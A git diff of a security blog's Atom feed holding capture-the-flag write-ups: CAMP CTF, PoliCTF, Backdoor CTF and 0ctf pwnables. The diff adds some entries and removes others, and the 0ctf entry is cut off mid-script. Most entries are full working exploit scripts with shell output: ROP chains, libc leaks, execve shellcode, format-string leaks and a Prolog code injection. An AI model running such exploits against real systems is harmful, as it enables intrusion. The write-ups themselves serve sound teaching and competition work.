+payload += q(0x600c70)  # value for r14 -&gt; goes into rsi -&gt; overwrite printf()
+payload += q(0)         # value for r15 -&gt; goes into rdi -&gt; 0 -&gt; stdin
+
+payload += q(0x000002b6+base)
+payload += q(0) * 7
+
+payload += q(0x4006ec) # restart, so the binary will execute puts() -&gt; one shot rce, lands a shell
+
+def pwn():
+    global s
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(('challs.campctf.ccc.ac', 10106))
+    #s.connect(('localhost', 4444))
+
+    print readtil('name?')
+    s.send('a\n')
+    print readtil('message:')
+    s.send('-1\n')   # ty Swappage!
+    print readtil('text:')
+    s.send(payload+'\n')
+    print readtil('Thanks!\n')
+
+    data = s.recv(8)
+    data = data[:-1] + "\x00\x00"
+
+    puts_addr = struct.unpack('&lt;Q', data)[0]
+    print "[+] Leaked puts(): " + hex(struct.unpack('&lt;Q', data)[0])
+    libc_base = puts_addr - 0x70a30
+    print "[+] libc base addr: " + hex(libc_base)
+    system_addr = libc_base + 0x442AA # one shot rce, ty superkojiman!
+    print "[+] sending one shot rce addr (" + hex(system_addr) + ")"
+
+    s.send(q(system_addr))
+
+    import telnetlib
+    t = telnetlib.Telnet()
+    t.sock = s
+    t.interact()
+pwn()
+</code></pre>
+
+<p>And in action:</p>
+
+<pre><code class="bash">bas@tritonal:~/bin/ccc/phobos$ python poc2.py 
+&gt; What's your name?
+
+Hi, a
+&lt;randomjunk&gt;
+&gt; Please input the length of your message:
+
+&gt; Please enter your text:
+
+&gt; Thanks!
+
+[+] Leaked puts(): 0x7fa6830dda30
+[+] libc base addr: 0x7fa68306d000
+[+] sending one shot rce addr (0x7fa6830b12aa)
+id
+uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
+cat flag.txt
+CAMP15_0ae754f04a8782cba9a7ec2c69dc1274
+</code></pre>
+
+<p>It&rsquo;s quite nice to solve a 400 point challenge only to find out we can use nearly the same solution for an additional 300 points!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[CAMP CTF - Shell]]></title>
+    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-shell/"/>
+    <updated>2015-08-18T21:30:07+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-shell</id>
+    <content type="html"><![CDATA[<p>shell was a pwnable from CAMP CTF. We&rsquo;re given a 64-bit ELF binary, which shows the following when executed:</p>
+
+<!--more-->
+
+
+<pre><code class="bash">bas@tritonal:~/bin/ccc/shell$ ./shell
+$ help
+sh whoami date exit ls help hlep login
+$ sh
+Permission denied
+$ login
+Username: AAAA
+Password: BBBB
+Authentication failed!
+$ 
+</code></pre>
+
+<p>Furthermore, the output of <code>strings ./shell</code> shows that the binary is looking for <code>creds.txt</code>. I placed a file in the same directory with <code>admin:admin</code> as sole line and indeed, I could now login:</p>
+
+<pre><code class="bash">$ login
+Username: admin
+Password: admin
+Authenticated!
+# sh
+$
+</code></pre>
+
+<p>So we&rsquo;ll need to login with valid credentials, which we do not have yet. The rest of the commands are not of interest. Let&rsquo;s have a look at the disassembly, specifically at the part where our input is processed:</p>
+
+<pre><code>  400c2a:   movabs rdi,0x400f89
+  400c34:   mov    al,0x0
+  400c36:   call   400750 &lt;printf@plt&gt;
+  ; this is the buffer it's using
+  400c3b:   lea    rdi,[rbp-0x80]               
+  400c3f:   add    rdi,0x4
+  400c46:   mov    DWORD PTR [rbp-0xd0],eax
+  400c4c:   mov    al,0x0
+  ; here we get the username
+  400c4e:   call   400790 &lt;gets@plt&gt;
+  400c53:   movabs rdi,0x400f94
+  400c5d:   mov    DWORD PTR [rbp-0xd4],eax
+  400c63:   mov    al,0x0
+  400c65:   call   400750 &lt;printf@plt&gt;
+  ; this is the buffer for password
+  400c6a:   lea    rdi,[rbp-0x80]
+  400c6e:   add    rdi,0x24
+  400c75:   mov    DWORD PTR [rbp-0xd8],eax
+  400c7b:   mov    al,0x0
+  400c7d:   call   400790 &lt;gets@plt&gt;
+  400c82:   movabs rsi,0x400f9f
+  ; i suppose I can overwrite this value
+  400c8c:   mov    rdi,QWORD PTR [rbp-0x18]     ; creds.txt
+  400c90:   mov    DWORD PTR [rbp-0xdc],eax
+  400c96:   call   4007b0 &lt;fopen@plt&gt;
+</code></pre>
+
+<p>So basically, the calls to <code>gets()</code> happen to write to the stack. We&rsquo;re not able to overwrite the saved return address because of the canary, but we can overwrite the pointer at <code>[rbp-0x18]</code>, which contains a pointer to the string <code>creds.txt</code>. We can overwrite this with a pointer to another string, to make the binary open another file to check our credentials!</p>
+
+<p>The only option that I could find was <code>/lib64/ld-linux-x86-64.so.2</code>. The problem is, does this actually contain valid pairs of <code>user:name</code>? I grabbed the file via a shell I obtained on bitterman and ran it through strings:</p>
+
+<pre><code>bas@tritonal:~/bin/ccc/shell$ strings ./ld.so |grep ":"
+|F:m
+&lt;:uR
+sHu:H9
+...snip...
+FATAL: kernel too old
+Unused direct dependencies:
+    Version information:
+    %s:
+prelink checking: %s
+wrong ELF class: ELFCLASS32
+undefined symbol: 
+relocation processing: %s%s
+...snip...
+</code></pre>
+
+<p>Indeed, it does! So the plan is to overwrite the pointer on the stack with the pointer to <code>/lib64/ld-linux-x86-64.so.2</code>, then login with one of those combinations of &ldquo;username&rdquo; and &ldquo;password&rdquo;. The exploit:</p>
+
+<pre><code class="python">#!/usr/bin/python
+import struct, time
+from socket import *
+
+def q(x):
+    return struct.pack("&lt;Q", x)
+
+def readtil(delim):
+  buf = b''
+  while not delim in buf:
+      buf += s.recv(1)
+  return buf
+
+def pwn():
+    global s
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(('challs.campctf.ccc.ac', 10117))
+
+    readtil('$')
+    s.send('login\n')
+    readtil('Username:')
+    s.send('AAAA\n')
+    readtil('Password:')
+    # overwrite rbp-0x18, which used to contain a pointer to "creds.txt"
+    # overwrite it with a pointer to 0x400200 ("/lib64/ld-linux-x86-64.so.2")
+    # I harvested this file already via one of the other challenges
+    s.send("A"*68+q(0x400200)+'\n')
+
+    readtil('$')
+    s.send('login\n')
+    readtil('Username:')
+    s.send('relocation processing\n')
+    readtil('Password:')
+    s.send(' %s%s\n')
+
+    import telnetlib
+    t = telnetlib.Telnet()
+    t.sock = s
+    t.interact()
+pwn()
+</code></pre>
+
+<p>And it action:</p>
+
+<pre><code class="bash">bas@tritonal:~/bin/ccc/shell$ python ./poc.py 
+ Authenticated!
+# id
+Command not found
+# sh
+ls
+creds.txt
+flag.txt
+run.sh
+shell
+cat flag.txt
+CAMP15_408eed038796cfca32e2fdb3a8126429
+</code></pre>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[PoliCTF 2015 - John's Shuffle]]></title>
@@ -175,652 +1187,6 @@ cat: /home/ctf/johnshuffle: Permission denied
 </code></pre>
 
 <p>Easy peasy! The flag was <code>flag{rand0mizing_things_with_l0ve}</code>. Nice!</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[PoliCTF 2015 - John's Library]]></title>
-    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-library/"/>
-    <updated>2015-07-12T16:45:04+02:00</updated>
-    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-library</id>
-    <content type="html"><![CDATA[<p>Finally, pwnables! John&rsquo;s Library was worth 150 points. I was a bit rusty but I managed to grab this flag.</p>
-
-<!--more-->
-
-
-<p>We&rsquo;re given a 32 bit Linux ELF. Upon running it, we&rsquo;re presented with a library menu, where we can view titles, add them and exit the program:</p>
-
-<pre><code class="bash">Welcome to the jungle library mate! Try to escape!!
-
- r - read from library
- a - add element
- u - exit
-a
-Hey mate! Insert how long is the book title: 
-10000
-Hey you! what are you trying to do??
-</code></pre>
-
-<p>So we can&rsquo;t really add long titles. Upon inspection, Swappage and I noticed that the titles are stored on the stack, with the lengths in a special data structure in the <code>.data</code> of the binary:</p>
-
-<pre><code> 8048731: mov    eax,DWORD PTR [eax*4+0x804a060] ; 0x804a060 contains lengths
- 8048738: mov    edx,eax
- 804873a: mov    eax,DWORD PTR [ebp+0x8]         ; ptr to first book
- 804873d: add    eax,edx                         ; add length of last string to it
- 804873f: mov    DWORD PTR [esp],eax
- 8048742: call   8048410 &lt;gets@plt&gt;              ; grab book title
-</code></pre>
-
-<p>I noticed I could bypass the length check with a large number, effectively utilizing a signedness bug. This allowed us to overwrite the return address of <code>main()</code> on the stack. Although NX wasn&rsquo;t enabled, ASLR was enabled so we couldn&rsquo;t just jump to the shellcode on the stack. There weren&rsquo;t enough gadgets for a ROP chain. Instead, we needed to leak a stack address so we could return to the shellcode on the stack (bruteforcing it didn&rsquo;t work). That&rsquo;s where the read function came into play.</p>
-
-<p>Looking up a book title via the read function was done like this:</p>
-
-<pre><code> 8048678: mov    eax,DWORD PTR [ebp-0xc]         ; number we just submitted
- 804867b: mov    eax,DWORD PTR [eax*4+0x804a060] ; grab length of that book title
- 8048682: mov    edx,eax
- 8048684: mov    eax,DWORD PTR [ebp+0x8]         ; pointer to book titles on stack
- 8048687: add    eax,edx                         ; add length of string so eax points to book title 
- 8048689: mov    DWORD PTR [esp+0x4],eax
- 804868d: mov    DWORD PTR [esp],0x8048893
- 8048694: call   80483f0 &lt;printf@plt&gt;            ; dump title to user
-</code></pre>
-
-<p>By passing in a negative number, I was able to make <code>804867b: mov eax,DWORD PTR [eax*4+0x804a060]</code> point to <code>0x80493fc</code>, which contained <code>0xffffffe0</code>. Therefore, when this value is added to the pointer to the book titles, it actually is moved backwards and starts leaking stack addresses:</p>
-
-<pre><code>0xffffd1ab (address of book titles on stack) + 0xffffffe0 =&gt; 
-gdb-peda$ x/10x $eax
-0xffffd18b: 0x048614-&gt;ff    0xffd1ab&lt;-08    0x000002ff  0x15fd7c00
-0xffffd19b: 0x15fd7c00  0x15fd7c00  0x0000f000  0x0000f000
-</code></pre>
-
-<p>I now had a way to leak the book title buffer on the stack, where we could store shellcode in a book title. By exploiting the signedness bug, we could overwrite the return address of <code>main()</code>. After setting all of this up, we&rsquo;d ask the binary to exit and make it return to our shellcode. Putting it all together:</p>
-
-<pre><code class="python">from socket import *
-import struct, telnetlib, re, sys, time
-
-def readtil(delim):
-    buf = b''
-    while not delim in buf:
-        buf += s.recv(1)
-    return buf
-
-def sendln(b):
-    s.send(b + b'\n')
-
-def sendbin(b):
-    s.sendall(b)
-
-def p(x):
-    return struct.pack('&lt;L', x &amp; 0xffffffff)
-
-def pwn():
-    global s
-    s=socket(AF_INET, SOCK_STREAM)
-    s.connect(('library.polictf.it', 80))
-
-    readtil('exit')
-
-    # mem leak
-    sendln('r')
-    readtil('read:')
-    sendln('-793')  
-    # -793*4 = 0xfffff39c; 
-    # 0x804867b &lt;read_from_library+58&gt;: mov eax,DWORD PTR [eax*4+0x804a060] 
-    # -&gt; 0x80493fc == 0xffffffe0
-
-    # leak stack addr
-    time.sleep(0.1)
-    buf = s.recv(20)
-    stackaddr = struct.unpack('&lt;L', buf[6:10])[0]
-    print hex(stackaddr+100)
-    readtil('exit')
-
-    sendln('a')
-    readtil('title:')
-    sendln('1')
-    sendln('b')
-
-    readtil('exit')
-
-    sendln('a')
-    readtil('title:')
-    # 2**32 -&gt; integer overflow, 
-    # we now have plenty of space to overwrite the saved return address
-    sendln('4294967296') 
-
-    # the reason i divided the nop sled is simple; for some reason, when the shellcode executes, 
-    # it overwrites itself if it's at the end. this solves it; didn't debug it 
-    sendln("\x90"*(0x30f-37)+"\x83\xec\x7f\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcc\x80"+"A"*0x100+p(stackaddr+200)) # 0xffffd1ad -&gt; start of our buffer
-
-    readtil('exit')
-    sendln('u')
-
-    t = telnetlib.Telnet()
-    t.sock = s
-
-    t.interact()
-
-    s.close()
-
-pwn()
-</code></pre>
-
-<p>And running it:</p>
-
-<pre><code class="bash">bas@tritonal:~/tmp/polictf/johns-library$ python sn0w.py 
-
-id
-uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
-cd /home/ctf
-ls
-challenge
-flag
-cat flag
-flag{John_should_read_a_real_book_on_s3cur3_pr0gr4mm1ng}
-</code></pre>
-
-<p>The flag was <code>flag{John_should_read_a_real_book_on_s3cur3_pr0gr4mm1ng}</code>.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[PoliCTF 2015 - Hanoi as a Service]]></title>
-    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-hanoi-as-a-service/"/>
-    <updated>2015-07-12T16:30:31+02:00</updated>
-    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-hanoi-as-a-service</id>
-    <content type="html"><![CDATA[<p>Hanoi As A Service was a 50 point pwnable in PoliCTF and gave me a reason to hate PROLOG.</p>
-
-<!--more-->
-
-
-<p>We&rsquo;re given <code>nc haas.polictf.it 80</code> as point of attack. Let&rsquo;s start:</p>
-
-<pre><code class="bash">bas@tritonal:~$ nc haas.polictf.it 80
-Welcome to the Hanoi-as-a-Service cloud platform!
-How many disks does your tower have?
-
-ERROR: Prolog initialisation failed:
-ERROR: Syntax error: Unexpected end of clause
-ERROR: hanoi() 
-ERROR: ** here **
-ERROR: .
-</code></pre>
-
-<p>Interesting. I now know I&rsquo;m up against some Prolog program. Let&rsquo;s see if we can inject Prolog code:</p>
-
-<pre><code class="bash">bas@tritonal:~$ nc haas.polictf.it 80
-Welcome to the Hanoi-as-a-Service cloud platform!
-How many disks does your tower have?
-0), hanoi(2). 
-* Move top disk from a to c
-* Move top disk from a to b
-* Move top disk from c to b
-</code></pre>
-
-<p>Looks like we can! Now, since I never learned Prolog as a kid (I&rsquo;m more of a BASIC boy), I searched around for code examples. I couldn&rsquo;t just grab the flag so I started with enumerating.</p>
-
-<pre><code class="bash">bas@tritonal:~$ nc haas.polictf.it 80
-Welcome to the Hanoi-as-a-Service cloud platform!
-How many disks does your tower have?
-0), expand_file_name('/home/*', S), write(S). 
-[/home/ctf,/home/ubuntu]
-
-# enumerate /home/ctf:
-
-bas@tritonal:~$ nc haas.polictf.it 80
-Welcome to the Hanoi-as-a-Service cloud platform!
-How many disks does your tower have?
-0), expand_file_name('/home/ctf/*', S), write(S). %
-[/home/ctf/haas]bas@tritonal:~$ 
-
-# enumerate /home/ctf/haas:
-
-bas@tritonal:~$ nc haas.polictf.it 80
-Welcome to the Hanoi-as-a-Service cloud platform!
-How many disks does your tower have?
-0), expand_file_name('/home/ctf/haas/*', S), write(S).  
-[/home/ctf/haas/haas,/home/ctf/haas/haas-proxy.py,/home/ctf/haas/jhknsjdfhef_flag_here]
-</code></pre>
-
-<p>I now had the location of the flag. Now, to read it&hellip; Turns out Prolog does not have a &ldquo;normal&rdquo; way to read arbitrary files (it expects Prolog terms or something). I searched for a good while and finally:</p>
-
-<pre><code class="bash">bas@tritonal:~$ nc haas.polictf.it 80
-Welcome to the Hanoi-as-a-Service cloud platform!
-How many disks does your tower have?
-0), open('/home/ctf/haas/jhknsjdfhef_flag_here', read, S), read_line_to_codes(S, T), write(T). 
-[102,108,97,103,123,80,114,48,103,114,97,109,109,49,110,103,95,105,110,95,108,48,103,49,99,95,49,115,95,99,48,48,108,125]
-</code></pre>
-
-<p>Back to python!</p>
-
-<pre><code class="python">&gt;&gt;&gt; a = [102,108,97,103,123,80,114,48,103,114,97,109,109,49,110,103,95,105,110,95,108,48,103,49,99,95,49,115,95,99,48,48,108,125]
-&gt;&gt;&gt; print "".join([chr(x) for x in a])
-flag{Pr0gramm1ng_in_l0g1c_1s_c00l}
-</code></pre>
-
-<p>50 points and first blood for Team Vulnhub.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Backdoor CTF - Team]]></title>
-    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-team/"/>
-    <updated>2015-04-02T19:23:27+02:00</updated>
-    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-team</id>
-    <content type="html"><![CDATA[<p>Backdoor CTF was hosted on a weekday, so we only had the evening to grab as many flags as we could. Here&rsquo;s how we solved <code>team</code> for 600 points.</p>
-
-<!-- more -->
-
-
-<p>The binary we&rsquo;ve been given is a 32-bit ELF. The output of strings doesn&rsquo;t give us much. Using <code>strace ./team</code>, it becomes clear that the binary reads from <code>flag.txt</code> so I created one locally. I echoed <code>flag1</code> to the file and restarted the binary.</p>
-
-<p>It asks for a team name and a flag. After receiving these values in heap buffers (non-overflowable as far as I could gather) it proceeds to read the flag from <code>flag.txt</code>. Then, it compares the user input to the flag using <code>strcmp</code>.</p>
-
-<p>The team name is then printed using <code>printf</code>: this is vulnerable to a format string vulnerability:</p>
-
-<pre><code>bas@tritonal:~/tmp/bckdr/team-600$ ./team
-Enter teamname: TEAM%llp
-Enter flag: FLAG%llp
-TEAM0x64 : incorrect flag. Try again.
-</code></pre>
-
-<p>Okay, so let&rsquo;s have a look at the stack when we reach <code>printf</code>. It gets called at <code>8048711</code> to print the team name.</p>
-
-<pre><code>Breakpoint 1, 0x08048711 in ?? ()
-gdb-peda$ x/40wx $esp
-0xffffd510: 0x0804b008  0x00000064  0x0804b140  0x00000000
-0xffffd520: 0x00000000  0x00000000  0x0804b0d8  0x0804b008
-0xffffd530: 0x00000000  0x0804b140  0x67616c66  0x00000031
-0xffffd540: 0x00000000  0x00000000  0x00000000  0x00000000
-0xffffd550: 0x00000000  0x00000000  0x00000000  0x00000000
-0xffffd560: 0x00000000  0x00000000  0x00000000  0x00000000
-0xffffd570: 0x00000000  0x00000000  0x00000000  0x00000000
-0xffffd580: 0x00000000  0x00000000  0x00000000  0x00000000
-0xffffd590: 0x00000000  0x00000002  0x00000000  0x856b7a00
-0xffffd5a0: 0x00000000  0x00000000  0xffffd5d8  0x0804880c
-</code></pre>
-
-<p>What&rsquo;s this then? From breakpointing <code>strcmp</code>, I learned that the flag was on the stack. In fact, it&rsquo;s within reach of the format string vulnerability!</p>
-
-<pre><code>0xffffd530: 0x00000000  0x0804b140  0x67616c66  0x00000031
-                          flag1 &gt;&gt;&gt;   g a l f           1
-</code></pre>
-
-<p>That&rsquo;s too easy, right? Wrong! The flag starts at <code>%10$p</code>:</p>
-
-<pre><code class="bash">bas@tritonal:~/tmp/bckdr/team-600$ ./team
-Enter teamname: %10$p
-Enter flag: bleh
-0x67616c66 : incorrect flag. Try again.
-</code></pre>
-
-<p>It worked remotely with this script:</p>
-
-<pre><code class="python">from socket import *
-import struct, telnetlib, re, sys
-
-def readtil(delim):
-    buf = b''
-    while not delim in buf:
-        buf += s.recv(1)
-    return buf
-
-def sendln(b):
-    s.send(b + b'\n')
-
-def sendbin(b):
-    s.sendall(b)
-
-def p(x):
-    return struct.pack('&lt;L', x &amp; 0xffffffff)
-
-def pwn(n):
-    global s
-    s=socket(AF_INET, SOCK_STREAM)
-    s.connect(('hack.bckdr.in', 8004))
-
-    readtil('teamname: ')
-    sendln("AAAA%"+str(n)+"$p")
-    readtil('flag: ')
-    sendln("CTF_TEAM_VULNHUB")
-    data = readtil('again.')
-
-    s.close()
-    m = re.findall(r'0x([0-9a-f]*) :', data)
-    return m[0]
-
-full = ''
-for i in xrange(10, 30):
-    full += pwn(i).decode('hex')[::-1]
-    print full
-</code></pre>
-
-<p>This spits out the flag until it hits something it can&rsquo;t hex decode. Because the CTF is long-lived, we won&rsquo;t post any flags.</p>
-
-<p>Far too easy for a 600 point challenge, but we&rsquo;re not complaining&hellip;</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[0ctf - Login]]></title>
-    <link href="http://barrebas.github.io/blog/2015/03/30/0ctf-login/"/>
-    <updated>2015-03-30T20:17:23+02:00</updated>
-    <id>http://barrebas.github.io/blog/2015/03/30/0ctf-login</id>
-    <content type="html"><![CDATA[<p>The second pwnable I solved for <code>0ctf</code> on behalf of CTF-Team VulnHub! This one contained My Favorite Vulnerability, guess which one?</p>
-
-<!-- more -->
-
-
-<p><code>login</code> was a 64-bit ELF. Quickly checking what I was up against with <code>gdb-peda</code>:</p>
-
-<pre><code class="bash">gdb-peda$ checksec
-CANARY    : ENABLED
-FORTIFY   : disabled
-NX        : ENABLED
-PIE       : ENABLED
-RELRO     : FULL
-</code></pre>
-
-<p>Oops. This looks like fun! The description said to login as guest, and login as root. Together with the output of <code>strings</code>, this allowed me to bypass the first login:</p>
-
-<pre><code class="bash">Login: guest
-Password: guest123
-== 0CTF Login System ==
-1. Show Profile
-2. Login as User
-3. Logout
-=======================
-Your choice: 1
-Username: guest
-Level: Guest
-</code></pre>
-
-<p>Now, we&rsquo;re presented with three choices. With <code>2</code>, we can change our username and view it with <code>1</code>. However, this was not vulnerable to overflows or format string vulnerabilities. I dug into the menu system, looking for hidden things, and indeed:</p>
-
-<pre><code>;;; print_menu and get_choice
-1265: call   ddd &lt;open@plt+0x24d&gt;   
-126a: mov    DWORD PTR [rbp-0x4],eax
-126d: mov    eax,DWORD PTR [rbp-0x4]
-1270: cmp    eax,0x2
-1273: je     1299 &lt;open@plt+0x709&gt;
-1275: cmp    eax,0x2
-1278: jg     1281 &lt;open@plt+0x6f1&gt;
-127a: cmp    eax,0x1
-127d: je     128d &lt;open@plt+0x6fd&gt;
-127f: jmp    12e3 &lt;open@plt+0x753&gt;
-1281: cmp    eax,0x3
-1284: je     12a5 &lt;open@plt+0x715&gt;
-1286: cmp    eax,0x4                ; AHA! Secret entry
-1289: je     12b8 &lt;open@plt+0x728&gt;  ; Jump to 12b8
-128b: jmp    12e3 &lt;open@plt+0x753&gt;
-128d: mov    eax,0x0
-1292: call   f24 &lt;open@plt+0x394&gt;
-1297: jmp    12f0 &lt;open@plt+0x760&gt;
-1299: mov    eax,0x0
-129e: call   f7a &lt;open@plt+0x3ea&gt;
-12a3: jmp    12f0 &lt;open@plt+0x760&gt;
-12a5: lea    rdi,[rip+0x246]        # 14f2 &lt;open@plt+0x962&gt;
-12ac: call   a90 &lt;puts@plt&gt;
-12b1: mov    eax,0x0
-12b6: jmp    12f5 &lt;open@plt+0x765&gt;
-
-;;; choice 4
-12b8: lea    rax,[rip+0x200d81]     ; rax points to our provided username (e.g. 'root')
-12bf: mov    eax,DWORD PTR [rax+0x100]  ; check this flag... starts off as 0x1
-12c5: test   eax,eax
-12c7: jne    12d5 &lt;open@plt+0x745&gt;
-</code></pre>
-
-<p>So we need to bypass this secret menu and make sure that the flag is set to <code>0x00</code>. As I said, <code>rax</code> points to our input, and the flag comes 256 bytes after that. It starts out as 1 and we need to make it zero&hellip; we&rsquo;re looking for an off-by-one! This is present in the <code>input username</code> function, allowing the reset of the flag and entering the secret login menu:</p>
-
-<pre><code>Login: guest
-Password: guest123
-== 0CTF Login System ==
-1. Show Profile
-2. Login as User
-3. Logout
-=======================
-Your choice: 2
-Enter your new username:
-HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
-Done.
-== 0CTF Login System ==
-1. Show Profile
-2. Login as User
-3. Logout
-=======================
-Your choice: 4
-Login: root
-Password: toor
-root login failed.
-1 chance remaining.
-Login: %llp
-Password: bleh
-0x7f13e2689490 login failed.
-Threat detected. System shutdown.
-</code></pre>
-
-<p>I won&rsquo;t show the disassembly, but just describe what happens. Locally, the binary takes the md5 of our supplied password, but compares it to <code>0ops{secret_md5}</code>. If it matches, it calls a function to dump the flag. I figured the remote binary would contain the real md5, so I needed a way to read from the process remotely. The vulnerability to do so was found soon enough, it&rsquo;s a format string vulnerability. We get two chances. I used the first to leak a stack address and an address of the binary (because of PIE, it&rsquo;s loaded at a different address each time). The second printf call is then used to leak the md5 to which our supplied password is compared.</p>
-
-<p>Easy, right? Wrong. The remote binary returned the same string, <code>0ops{secret_md5}</code>. Obviously, I had to find another way to break this binary.</p>
-
-<h2>The Nitty Gritty</h2>
-
-<p>I tried overwriting a GOT pointer with the format string vulnerability, but failed: the GOT section was marked read-only! I looked for other ways to gain control of execution or making the <code>memcmp</code> succeed, but could only come up with one thing: overwriting the saved return address of the second printf call.</p>
-
-<pre><code>11d9: lea    rsi,[rip+0x2b5]       ; 'secret_MD5' --&gt; same remotely :?
-11e0: mov    rdi,rax
-11e3: call   b70 &lt;memcmp@plt&gt;
-11e8: test   eax,eax
-11ea: jne    11f8 &lt;open@plt+0x668&gt;
-11ec: mov    eax,0x0
-11f1: call   fb3 &lt;open@plt+0x423&gt;
-11f6: jmp    122e &lt;open@plt+0x69e&gt;
-11f8: lea    rax,[rbp-0x210]
-11ff: mov    rdi,rax
-1202: mov    eax,0x0
-1207: call   a70 &lt;printf@plt&gt;      ; second printf call; overwrite saved ret addr using format string vuln
-120c: lea    rdi,[rip+0x293]        # 14a6 &lt;open@plt+0x916&gt;
-1213: call   a90 &lt;puts@plt&gt;
-1218: lea    rdi,[rip+0x2b1]        # 14d0 &lt;open@plt+0x940&gt;
-121f: call   a90 &lt;puts@plt&gt;
-1224: mov    edi,0x1
-1229: call   aa0 &lt;exit@plt&gt;
-</code></pre>
-
-<p>I found a nice, stable stack pointer that I could leak, calculated the offset to the location of the saved return address and plugged it in a poc script. Locally, it gave me the flag! I quickly tried it remotely, but it failed miserably. Turns out the layout of the stack was different; the leaked stack pointer was at a different location. Furthermore, the offset from other leaked stack addresses to the saved return address of the second printf was different. Back to the drawing board?</p>
-
-<h2>Some luck involved</h2>
-
-<p>I spent some time trying to locate other stack addresses that I could leak and gave me a nice, stable way to calculate the location of the saved return address. I had a way to leak the binary address, meaning I could calculate the exact return address. I then started brute-forcing stack pointers and using the second printf to dump the memory from the stack. Using this, I was looking for the correct return address. Because I was fed up with it and it was late, I had forgotten to remove a certain constant from the poc that I used locally.</p>
-
-<pre><code class="python">from socket import *
-import struct, telnetlib, re, sys
-
-def readtil(delim):
-    buf = b''
-    while not e in buf:
-        buf += s.recv(1)
-    return buf
-
-def sendln(b):
-    s.send(b + b'\n')
-
-def sendbin(b):
-    s.sendall(b)
-
-def q(x):
-    return struct.pack('&lt;Q', x)
-
-def pwn():
-    global s
-    s=socket(AF_INET, SOCK_STREAM)
-    #s.connect(('localhost', 6666))
-    s.connect(('202.112.26.107', 10910))
-
-    raw_input()
-
-    readtil('Login: ')
-    sendln('guest')
-    readtil('Password: ')
-    sendln('guest123')
-    readtil('choice: ')
-    sendln('2')
-    readtil('username:')
-    sendln("A"*256)     # overflow userflag
-    readtil('choice: ')
-    sendln('4')         # secret login menu
-
-    ### first format string vuln to read stack addr
-    readtil('Login: ')
-    # leak both binary address and stack address
-    sendln('%1$lp-%'+sys.argv[1]+'$lp')
-    readtil('Password: ')
-    sendln('bleh')
-    data = readtil('login failed.')
-
-    m = re.findall(r'([a-f0-9]{5,})', data)
-    # find stack addr:
-    stack_addr = int(m[1], 16) 
-    base_addr = int(m[0], 16) - 0x1490
-
-    print "[+] Leaked address of base: {}".format(hex(base_addr))
-    print "[+] Leaked address of stack: {}".format(hex(stack_addr))
-
-    readtil('Login: ')
-
-    sendln('AAAAAAABBBC%10$s'+q(stack_addr-504))    # this offset of 504 was found locally and seems to be correct for remote, too
-
-    readtil('Password: ')
-    sendln('bleh')
-    data = s.recv(1000)
-    print data 
-    print hex(struct.unpack('&lt;Q', data[len('AAAAAAABBBC'):len('AAAAAAABBBC')+6]+b"\x00\x00")[0])
-    print "you're looking for {}".format(hex(base_addr + 0x120c))
-
-    # check if the stack location contains the right return address
-    if (struct.unpack('&lt;Q', data[len('AAAAAAABBBC'):len('AAAAAAABBBC')+6]+b"\x00\x00")[0]) == (base_addr + 0x120c):
-        print "Found at {}".format(sys.argv[1])
-        raw_input()
-
-    t = telnetlib.Telnet()
-    t.sock = s
-    t.interact()
-
-    s.close()
-
-pwn()
-</code></pre>
-
-<p>Note: the exact layout of the format string is chosen such that the stack address is overlapping with an actuall address on the stack. Because we can&rsquo;t send null-bytes, if we overwrite something else, the pointer would be mangled:</p>
-
-<pre><code>before: 0xdeadbeef 0xcafebabe
-after:  0x504ddb66 0x7fff00be -&gt; stack address is invalid, pointing to 0xbe007fff....
-
-should be:
-
-before: 0xdeadbeef 0xcafe0000
-after:  0x504ddb66 0x7fff0000 -&gt; properly set stack address
-</code></pre>
-
-<p>Locally, I identified both the arguments 15 and 41 (in the first format string vuln) to contain the right stack address. Remotely, these contained something different. However, I simply increased the number until I hit 43: this address, combined with the offset, contained the return address! I definitely lucked out after banging my head against the challenge for a few hours.</p>
-
-<h2>Hitting the jackpot</h2>
-
-<pre><code class="bash">$ python poc.py 43
-
-[+] Leaked address of base: 0x7f48589d5000
-[+] Leaked address of stack: 0x7fffb65656b0
-[+] Offset format string with 24497 bytes
-AAAAAAABBBC
-           b.XH..TV...
-0x7f48589d620c
-you're looking for 0x7f48589d620c
-Found at 43
-</code></pre>
-
-<p>Armed with the correct stack address, I could now trivially overwrite two bytes of the saved return address so that it points to the function that read the flag and dumps it over the socket:</p>
-
-<pre><code class="python">from socket import *
-import struct, telnetlib, re, sys
-
-def readtil(delim):
-    buf = b''
-    while not delim in buf:
-        buf += s.recv(1)
-    return buf
-
-def sendln(b):
-    s.send(b + b'\n')
-
-def sendbin(b):
-    s.sendall(b)
-
-def q(x):
-    return struct.pack('&lt;Q', x)
-
-def pwn():
-    global s
